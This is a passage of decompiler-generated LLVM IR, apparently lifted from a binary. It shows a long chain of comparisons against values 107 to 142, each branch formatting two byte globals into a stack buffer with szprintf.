  %v8_c164 = call i32 @szprintf(i32 %v2_c140, i32 ptrtoint ([12 x i8]* @global_var_205fc.279 to i32), i32 %v4_c164, i32 %v6_c164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c168

dec_label_pc_c168:                                ; preds = %dec_label_pc_c134, %dec_label_pc_c140
  %v7_c16c = icmp eq i32 %v2_a93c, 107
  br i1 %v7_c16c, label %dec_label_pc_c174, label %dec_label_pc_c19c

dec_label_pc_c174:                                ; preds = %dec_label_pc_c168
  %v2_c174 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c180 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c18c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c198 = sext i8 %v3_c180 to i32
  %v6_c198 = sext i8 %v3_c18c to i32
  %v8_c198 = call i32 @szprintf(i32 %v2_c174, i32 ptrtoint ([13 x i8]* @global_var_20608.281 to i32), i32 %v4_c198, i32 %v6_c198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c168, %dec_label_pc_c174
  %v7_c1a0 = icmp eq i32 %v2_a93c, 108
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c1d0

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c19c
  %v2_c1a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1b4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c1c0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c1cc = sext i8 %v3_c1b4 to i32
  %v6_c1cc = sext i8 %v3_c1c0 to i32
  %v8_c1cc = call i32 @szprintf(i32 %v2_c1a8, i32 ptrtoint ([14 x i8]* @global_var_20618.283 to i32), i32 %v4_c1cc, i32 %v6_c1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1d0

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c1a8
  %v7_c1d4 = icmp eq i32 %v2_a93c, 109
  br i1 %v7_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c204

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1d0
  %v2_c1dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1e8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c1f4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c200 = sext i8 %v3_c1e8 to i32
  %v6_c200 = sext i8 %v3_c1f4 to i32
  %v8_c200 = call i32 @szprintf(i32 %v2_c1dc, i32 ptrtoint ([14 x i8]* @global_var_20628.285 to i32), i32 %v4_c200, i32 %v6_c200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c204

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1d0, %dec_label_pc_c1dc
  %v7_c208 = icmp eq i32 %v2_a93c, 110
  br i1 %v7_c208, label %dec_label_pc_c210, label %dec_label_pc_c238

dec_label_pc_c210:                                ; preds = %dec_label_pc_c204
  %v2_c210 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c21c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c228 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c234 = sext i8 %v3_c21c to i32
  %v6_c234 = sext i8 %v3_c228 to i32
  %v8_c234 = call i32 @szprintf(i32 %v2_c210, i32 ptrtoint ([13 x i8]* @global_var_20638.287 to i32), i32 %v4_c234, i32 %v6_c234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c210
  %v7_c23c = icmp eq i32 %v2_a93c, 111
  br i1 %v7_c23c, label %dec_label_pc_c244, label %dec_label_pc_c26c

dec_label_pc_c244:                                ; preds = %dec_label_pc_c238
  %v2_c244 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c250 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c25c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c268 = sext i8 %v3_c250 to i32
  %v6_c268 = sext i8 %v3_c25c to i32
  %v8_c268 = call i32 @szprintf(i32 %v2_c244, i32 ptrtoint ([14 x i8]* @global_var_20648.289 to i32), i32 %v4_c268, i32 %v6_c268, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c26c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c238, %dec_label_pc_c244
  %v7_c270 = icmp eq i32 %v2_a93c, 112
  br i1 %v7_c270, label %dec_label_pc_c278, label %dec_label_pc_c2a0

dec_label_pc_c278:                                ; preds = %dec_label_pc_c26c
  %v2_c278 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c284 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c290 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c29c = sext i8 %v3_c284 to i32
  %v6_c29c = sext i8 %v3_c290 to i32
  %v8_c29c = call i32 @szprintf(i32 %v2_c278, i32 ptrtoint ([14 x i8]* @global_var_20658.291 to i32), i32 %v4_c29c, i32 %v6_c29c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2a0

dec_label_pc_c2a0:                                ; preds = %dec_label_pc_c26c, %dec_label_pc_c278
  %v7_c2a4 = icmp eq i32 %v2_a93c, 113
  br i1 %v7_c2a4, label %dec_label_pc_c2ac, label %dec_label_pc_c2d4

dec_label_pc_c2ac:                                ; preds = %dec_label_pc_c2a0
  %v2_c2ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2b8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c2c4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c2d0 = sext i8 %v3_c2b8 to i32
  %v6_c2d0 = sext i8 %v3_c2c4 to i32
  %v8_c2d0 = call i32 @szprintf(i32 %v2_c2ac, i32 ptrtoint ([13 x i8]* @global_var_20668.293 to i32), i32 %v4_c2d0, i32 %v6_c2d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2d4

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_c2a0, %dec_label_pc_c2ac
  %v7_c2d8 = icmp eq i32 %v2_a93c, 114
  br i1 %v7_c2d8, label %dec_label_pc_c2e0, label %dec_label_pc_c308

dec_label_pc_c2e0:                                ; preds = %dec_label_pc_c2d4
  %v2_c2e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2ec = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c2f8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c304 = sext i8 %v3_c2ec to i32
  %v6_c304 = sext i8 %v3_c2f8 to i32
  %v8_c304 = call i32 @szprintf(i32 %v2_c2e0, i32 ptrtoint ([14 x i8]* @global_var_20678.295 to i32), i32 %v4_c304, i32 %v6_c304, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c308

dec_label_pc_c308:                                ; preds = %dec_label_pc_c2d4, %dec_label_pc_c2e0
  %v7_c30c = icmp eq i32 %v2_a93c, 115
  br i1 %v7_c30c, label %dec_label_pc_c314, label %dec_label_pc_c33c

dec_label_pc_c314:                                ; preds = %dec_label_pc_c308
  %v2_c314 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c320 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c32c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c338 = sext i8 %v3_c320 to i32
  %v6_c338 = sext i8 %v3_c32c to i32
  %v8_c338 = call i32 @szprintf(i32 %v2_c314, i32 ptrtoint ([13 x i8]* @global_var_20688.297 to i32), i32 %v4_c338, i32 %v6_c338, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c308, %dec_label_pc_c314
  %v7_c340 = icmp eq i32 %v2_a93c, 116
  br i1 %v7_c340, label %dec_label_pc_c348, label %dec_label_pc_c370

dec_label_pc_c348:                                ; preds = %dec_label_pc_c33c
  %v2_c348 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c354 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c360 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c36c = sext i8 %v3_c354 to i32
  %v6_c36c = sext i8 %v3_c360 to i32
  %v8_c36c = call i32 @szprintf(i32 %v2_c348, i32 ptrtoint ([13 x i8]* @global_var_20698.299 to i32), i32 %v4_c36c, i32 %v6_c36c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c33c, %dec_label_pc_c348
  %v7_c374 = icmp eq i32 %v2_a93c, 117
  br i1 %v7_c374, label %dec_label_pc_c37c, label %dec_label_pc_c3a4

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c370
  %v2_c37c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c388 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c394 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c3a0 = sext i8 %v3_c388 to i32
  %v6_c3a0 = sext i8 %v3_c394 to i32
  %v8_c3a0 = call i32 @szprintf(i32 %v2_c37c, i32 ptrtoint ([14 x i8]* @global_var_206a8.301 to i32), i32 %v4_c3a0, i32 %v6_c3a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3a4

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c370, %dec_label_pc_c37c
  %v7_c3a8 = icmp eq i32 %v2_a93c, 118
  br i1 %v7_c3a8, label %dec_label_pc_c3b0, label %dec_label_pc_c3d8

dec_label_pc_c3b0:                                ; preds = %dec_label_pc_c3a4
  %v2_c3b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3bc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c3c8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c3d4 = sext i8 %v3_c3bc to i32
  %v6_c3d4 = sext i8 %v3_c3c8 to i32
  %v8_c3d4 = call i32 @szprintf(i32 %v2_c3b0, i32 ptrtoint ([14 x i8]* @global_var_206b8.303 to i32), i32 %v4_c3d4, i32 %v6_c3d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3a4, %dec_label_pc_c3b0
  %v7_c3dc = icmp eq i32 %v2_a93c, 119
  br i1 %v7_c3dc, label %dec_label_pc_c3e4, label %dec_label_pc_c40c

dec_label_pc_c3e4:                                ; preds = %dec_label_pc_c3d8
  %v2_c3e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3f0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c3fc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c408 = sext i8 %v3_c3f0 to i32
  %v6_c408 = sext i8 %v3_c3fc to i32
  %v8_c408 = call i32 @szprintf(i32 %v2_c3e4, i32 ptrtoint ([14 x i8]* @global_var_206c8.305 to i32), i32 %v4_c408, i32 %v6_c408, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c40c

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c3d8, %dec_label_pc_c3e4
  %v7_c410 = icmp eq i32 %v2_a93c, 120
  br i1 %v7_c410, label %dec_label_pc_c418, label %dec_label_pc_c440

dec_label_pc_c418:                                ; preds = %dec_label_pc_c40c
  %v2_c418 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c424 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c430 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c43c = sext i8 %v3_c424 to i32
  %v6_c43c = sext i8 %v3_c430 to i32
  %v8_c43c = call i32 @szprintf(i32 %v2_c418, i32 ptrtoint ([14 x i8]* @global_var_206d8.307 to i32), i32 %v4_c43c, i32 %v6_c43c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c440

dec_label_pc_c440:                                ; preds = %dec_label_pc_c40c, %dec_label_pc_c418
  %v7_c444 = icmp eq i32 %v2_a93c, 121
  br i1 %v7_c444, label %dec_label_pc_c44c, label %dec_label_pc_c474

dec_label_pc_c44c:                                ; preds = %dec_label_pc_c440
  %v2_c44c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c458 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c464 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c470 = sext i8 %v3_c458 to i32
  %v6_c470 = sext i8 %v3_c464 to i32
  %v8_c470 = call i32 @szprintf(i32 %v2_c44c, i32 ptrtoint ([14 x i8]* @global_var_20618.283 to i32), i32 %v4_c470, i32 %v6_c470, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c440, %dec_label_pc_c44c
  %v7_c478 = icmp eq i32 %v2_a93c, 122
  br i1 %v7_c478, label %dec_label_pc_c480, label %dec_label_pc_c4a8

dec_label_pc_c480:                                ; preds = %dec_label_pc_c474
  %v2_c480 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c48c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c498 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c4a4 = sext i8 %v3_c48c to i32
  %v6_c4a4 = sext i8 %v3_c498 to i32
  %v8_c4a4 = call i32 @szprintf(i32 %v2_c480, i32 ptrtoint ([13 x i8]* @global_var_206e8.309 to i32), i32 %v4_c4a4, i32 %v6_c4a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %dec_label_pc_c474, %dec_label_pc_c480
  %v7_c4ac = icmp eq i32 %v2_a93c, 123
  br i1 %v7_c4ac, label %dec_label_pc_c4b4, label %dec_label_pc_c4dc

dec_label_pc_c4b4:                                ; preds = %dec_label_pc_c4a8
  %v2_c4b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4c0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c4cc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c4d8 = sext i8 %v3_c4c0 to i32
  %v6_c4d8 = sext i8 %v3_c4cc to i32
  %v8_c4d8 = call i32 @szprintf(i32 %v2_c4b4, i32 ptrtoint ([12 x i8]* @global_var_206f8.311 to i32), i32 %v4_c4d8, i32 %v6_c4d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4dc

dec_label_pc_c4dc:                                ; preds = %dec_label_pc_c4a8, %dec_label_pc_c4b4
  %v7_c4e0 = icmp eq i32 %v2_a93c, 124
  br i1 %v7_c4e0, label %dec_label_pc_c4e8, label %dec_label_pc_c510

dec_label_pc_c4e8:                                ; preds = %dec_label_pc_c4dc
  %v2_c4e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4f4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c500 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c50c = sext i8 %v3_c4f4 to i32
  %v6_c50c = sext i8 %v3_c500 to i32
  %v8_c50c = call i32 @szprintf(i32 %v2_c4e8, i32 ptrtoint ([14 x i8]* @global_var_20704.313 to i32), i32 %v4_c50c, i32 %v6_c50c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c510

dec_label_pc_c510:                                ; preds = %dec_label_pc_c4dc, %dec_label_pc_c4e8
  %v7_c514 = icmp eq i32 %v2_a93c, 125
  br i1 %v7_c514, label %dec_label_pc_c51c, label %dec_label_pc_c544

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c510
  %v2_c51c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c528 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c534 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c540 = sext i8 %v3_c528 to i32
  %v6_c540 = sext i8 %v3_c534 to i32
  %v8_c540 = call i32 @szprintf(i32 %v2_c51c, i32 ptrtoint ([14 x i8]* @global_var_20714.315 to i32), i32 %v4_c540, i32 %v6_c540, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c51c
  %v7_c548 = icmp eq i32 %v2_a93c, 126
  br i1 %v7_c548, label %dec_label_pc_c550, label %dec_label_pc_c578

dec_label_pc_c550:                                ; preds = %dec_label_pc_c544
  %v2_c550 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c55c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c568 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c574 = sext i8 %v3_c55c to i32
  %v6_c574 = sext i8 %v3_c568 to i32
  %v8_c574 = call i32 @szprintf(i32 %v2_c550, i32 ptrtoint ([14 x i8]* @global_var_20704.313 to i32), i32 %v4_c574, i32 %v6_c574, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_c544, %dec_label_pc_c550
  %v7_c57c = icmp eq i32 %v2_a93c, 127
  br i1 %v7_c57c, label %dec_label_pc_c584, label %dec_label_pc_c5ac

dec_label_pc_c584:                                ; preds = %dec_label_pc_c578
  %v2_c584 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c590 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c59c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c5a8 = sext i8 %v3_c590 to i32
  %v6_c5a8 = sext i8 %v3_c59c to i32
  %v8_c5a8 = call i32 @szprintf(i32 %v2_c584, i32 ptrtoint ([14 x i8]* @global_var_20724.317 to i32), i32 %v4_c5a8, i32 %v6_c5a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c578, %dec_label_pc_c584
  %v7_c5b0 = icmp eq i32 %v2_a93c, 128
  br i1 %v7_c5b0, label %dec_label_pc_c5b8, label %dec_label_pc_c5e0

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_c5ac
  %v2_c5b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5c4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c5d0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c5dc = sext i8 %v3_c5c4 to i32
  %v6_c5dc = sext i8 %v3_c5d0 to i32
  %v8_c5dc = call i32 @szprintf(i32 %v2_c5b8, i32 ptrtoint ([14 x i8]* @global_var_20734.319 to i32), i32 %v4_c5dc, i32 %v6_c5dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5e0

dec_label_pc_c5e0:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c5b8
  %v7_c5e4 = icmp eq i32 %v2_a93c, 129
  br i1 %v7_c5e4, label %dec_label_pc_c5ec, label %dec_label_pc_c614

dec_label_pc_c5ec:                                ; preds = %dec_label_pc_c5e0
  %v2_c5ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5f8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c604 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c610 = sext i8 %v3_c5f8 to i32
  %v6_c610 = sext i8 %v3_c604 to i32
  %v8_c610 = call i32 @szprintf(i32 %v2_c5ec, i32 ptrtoint ([14 x i8]* @global_var_20744.321 to i32), i32 %v4_c610, i32 %v6_c610, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c614

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5e0, %dec_label_pc_c5ec
  %v7_c618 = icmp eq i32 %v2_a93c, 130
  br i1 %v7_c618, label %dec_label_pc_c620, label %dec_label_pc_c648

dec_label_pc_c620:                                ; preds = %dec_label_pc_c614
  %v2_c620 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c62c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c638 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c644 = sext i8 %v3_c62c to i32
  %v6_c644 = sext i8 %v3_c638 to i32
  %v8_c644 = call i32 @szprintf(i32 %v2_c620, i32 ptrtoint ([14 x i8]* @global_var_20754.323 to i32), i32 %v4_c644, i32 %v6_c644, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c614, %dec_label_pc_c620
  %v7_c64c = icmp eq i32 %v2_a93c, 131
  br i1 %v7_c64c, label %dec_label_pc_c654, label %dec_label_pc_c67c

dec_label_pc_c654:                                ; preds = %dec_label_pc_c648
  %v2_c654 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c660 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c66c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c678 = sext i8 %v3_c660 to i32
  %v6_c678 = sext i8 %v3_c66c to i32
  %v8_c678 = call i32 @szprintf(i32 %v2_c654, i32 ptrtoint ([14 x i8]* @global_var_20764.325 to i32), i32 %v4_c678, i32 %v6_c678, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c648, %dec_label_pc_c654
  %v7_c680 = icmp eq i32 %v2_a93c, 132
  br i1 %v7_c680, label %dec_label_pc_c688, label %dec_label_pc_c6b0

dec_label_pc_c688:                                ; preds = %dec_label_pc_c67c
  %v2_c688 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c694 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c6a0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c6ac = sext i8 %v3_c694 to i32
  %v6_c6ac = sext i8 %v3_c6a0 to i32
  %v8_c6ac = call i32 @szprintf(i32 %v2_c688, i32 ptrtoint ([14 x i8]* @global_var_20774.327 to i32), i32 %v4_c6ac, i32 %v6_c6ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6b0

dec_label_pc_c6b0:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c688
  %v7_c6b4 = icmp eq i32 %v2_a93c, 133
  br i1 %v7_c6b4, label %dec_label_pc_c6bc, label %dec_label_pc_c6e4

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6b0
  %v2_c6bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6c8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c6d4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c6e0 = sext i8 %v3_c6c8 to i32
  %v6_c6e0 = sext i8 %v3_c6d4 to i32
  %v8_c6e0 = call i32 @szprintf(i32 %v2_c6bc, i32 ptrtoint ([14 x i8]* @global_var_20784.329 to i32), i32 %v4_c6e0, i32 %v6_c6e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c6b0, %dec_label_pc_c6bc
  %v7_c6e8 = icmp eq i32 %v2_a93c, 134
  br i1 %v7_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c718

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e4
  %v2_c6f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6fc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c708 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c714 = sext i8 %v3_c6fc to i32
  %v6_c714 = sext i8 %v3_c708 to i32
  %v8_c714 = call i32 @szprintf(i32 %v2_c6f0, i32 ptrtoint ([14 x i8]* @global_var_20794.331 to i32), i32 %v4_c714, i32 %v6_c714, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c718

dec_label_pc_c718:                                ; preds = %dec_label_pc_c6e4, %dec_label_pc_c6f0
  %v7_c71c = icmp eq i32 %v2_a93c, 135
  br i1 %v7_c71c, label %dec_label_pc_c724, label %dec_label_pc_c74c

dec_label_pc_c724:                                ; preds = %dec_label_pc_c718
  %v2_c724 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c730 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c73c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c748 = sext i8 %v3_c730 to i32
  %v6_c748 = sext i8 %v3_c73c to i32
  %v8_c748 = call i32 @szprintf(i32 %v2_c724, i32 ptrtoint ([14 x i8]* @global_var_207a4.333 to i32), i32 %v4_c748, i32 %v6_c748, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c74c

dec_label_pc_c74c:                                ; preds = %dec_label_pc_c718, %dec_label_pc_c724
  %v7_c750 = icmp eq i32 %v2_a93c, 136
  br i1 %v7_c750, label %dec_label_pc_c758, label %dec_label_pc_c780

dec_label_pc_c758:                                ; preds = %dec_label_pc_c74c
  %v2_c758 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c764 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c770 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c77c = sext i8 %v3_c764 to i32
  %v6_c77c = sext i8 %v3_c770 to i32
  %v8_c77c = call i32 @szprintf(i32 %v2_c758, i32 ptrtoint ([14 x i8]* @global_var_207b4.335 to i32), i32 %v4_c77c, i32 %v6_c77c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c74c, %dec_label_pc_c758
  %v7_c784 = icmp eq i32 %v2_a93c, 137
  br i1 %v7_c784, label %dec_label_pc_c78c, label %dec_label_pc_c7b4

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c780
  %v2_c78c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c798 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c7a4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c7b0 = sext i8 %v3_c798 to i32
  %v6_c7b0 = sext i8 %v3_c7a4 to i32
  %v8_c7b0 = call i32 @szprintf(i32 %v2_c78c, i32 ptrtoint ([13 x i8]* @global_var_207c4.337 to i32), i32 %v4_c7b0, i32 %v6_c7b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c780, %dec_label_pc_c78c
  %v7_c7b8 = icmp eq i32 %v2_a93c, 138
  br i1 %v7_c7b8, label %dec_label_pc_c7c0, label %dec_label_pc_c7e8

dec_label_pc_c7c0:                                ; preds = %dec_label_pc_c7b4
  %v2_c7c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7cc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c7d8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c7e4 = sext i8 %v3_c7cc to i32
  %v6_c7e4 = sext i8 %v3_c7d8 to i32
  %v8_c7e4 = call i32 @szprintf(i32 %v2_c7c0, i32 ptrtoint ([13 x i8]* @global_var_207d4.339 to i32), i32 %v4_c7e4, i32 %v6_c7e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7e8

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7b4, %dec_label_pc_c7c0
  %v7_c7ec = icmp eq i32 %v2_a93c, 139
  br i1 %v7_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c81c

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e8
  %v2_c7f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c800 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c80c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c818 = sext i8 %v3_c800 to i32
  %v6_c818 = sext i8 %v3_c80c to i32
  %v8_c818 = call i32 @szprintf(i32 %v2_c7f4, i32 ptrtoint ([13 x i8]* @global_var_207e4.341 to i32), i32 %v4_c818, i32 %v6_c818, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c81c

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c7f4
  %v7_c820 = icmp eq i32 %v2_a93c, 140
  br i1 %v7_c820, label %dec_label_pc_c828, label %dec_label_pc_c850

dec_label_pc_c828:                                ; preds = %dec_label_pc_c81c
  %v2_c828 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c834 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c840 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c84c = sext i8 %v3_c834 to i32
  %v6_c84c = sext i8 %v3_c840 to i32
  %v8_c84c = call i32 @szprintf(i32 %v2_c828, i32 ptrtoint ([13 x i8]* @global_var_207f4.343 to i32), i32 %v4_c84c, i32 %v6_c84c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c850

dec_label_pc_c850:                                ; preds = %dec_label_pc_c81c, %dec_label_pc_c828
  %v7_c854 = icmp eq i32 %v2_a93c, 141
  br i1 %v7_c854, label %dec_label_pc_c85c, label %dec_label_pc_c884

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c850
  %v2_c85c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c868 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c874 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c880 = sext i8 %v3_c868 to i32
  %v6_c880 = sext i8 %v3_c874 to i32
  %v8_c880 = call i32 @szprintf(i32 %v2_c85c, i32 ptrtoint ([13 x i8]* @global_var_20804.345 to i32), i32 %v4_c880, i32 %v6_c880, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c884

dec_label_pc_c884:                                ; preds = %dec_label_pc_c850, %dec_label_pc_c85c
  %v7_c888 = icmp eq i32 %v2_a93c, 142
  br i1 %v7_c888, label %dec_label_pc_c890, label %dec_label_pc_c8b8

dec_label_pc_c890:                                ; preds = %dec_label_pc_c884
  %v2_c890 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c89c = load i8, i8* @global_var_2e4f9.69, align 1
